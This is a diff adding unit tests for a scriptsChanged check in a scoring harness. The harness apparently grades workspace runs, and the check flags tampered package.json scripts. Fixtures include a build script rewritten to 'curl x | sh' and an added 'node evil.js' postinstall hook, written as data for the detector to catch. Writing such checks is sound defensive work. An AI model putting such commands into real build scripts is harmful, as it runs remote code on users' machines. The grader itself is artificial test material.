@@ -11,6 +11,7 @@ import {
   parseArgs,
   parseTranscript,
   replacedRatio,
+  scriptsChanged,
 } from "../score.mjs";
 
 const WS = "/work/run1/workspace";
@@ -298,4 +299,50 @@ test("parseArgs validates modes", () => {
   const o = parseArgs(["--baseline", "--fixture", "next-static", "--out", "o"]);
   assert.equal(o.baseline, true);
   assert.ok(o.cli.endsWith("packages/cli/dist/index.js"));
+});
+
+const pkg = (scripts) => JSON.stringify({ name: "x", scripts });
+
+test("scriptsChanged: identical scripts are not flagged", () => {
+  const p = pkg({ build: "next build", start: "next start" });
+  const r = scriptsChanged(p, pkg({ start: "next start", build: "next build" }));
+  assert.equal(r.flagged, false);
+  assert.equal(r.error, null);
+});
+
+test("scriptsChanged: changed build reports old and new", () => {
+  const r = scriptsChanged(
+    pkg({ build: "next build" }),
+    pkg({ build: "curl x | sh && next build" }),
+  );
+  assert.equal(r.flagged, true);
+  assert.deepEqual(r.changed, [
+    { name: "build", from: "next build", to: "curl x | sh && next build" },
+  ]);
+});
+
+test("scriptsChanged: added postinstall and removed script are flagged", () => {
+  const r = scriptsChanged(
+    pkg({ build: "next build", lint: "x" }),
+    pkg({ build: "next build", postinstall: "node evil.js" }),
+  );
+  assert.equal(r.flagged, true);
+  assert.deepEqual(r.added, { postinstall: "node evil.js" });
+  assert.deepEqual(r.removed, ["lint"]);
+});
+
+test("scriptsChanged: missing or unparseable site package.json is reported, not thrown", () => {
+  const base = pkg({ build: "next build" });
+  const missing = scriptsChanged(base, null);
+  assert.equal(missing.flagged, true);
+  assert.match(missing.error, /missing/);
+  const bad = scriptsChanged(base, "{nope");
+  assert.equal(bad.flagged, true);
+  assert.match(bad.error, /unparseable/);
+});
+
+test("scriptsChanged: site with all scripts deleted is flagged as removed", () => {
+  const r = scriptsChanged(pkg({ build: "b" }), JSON.stringify({ name: "x" }));
+  assert.equal(r.flagged, true);
+  assert.deepEqual(r.removed, ["build"]);
 });
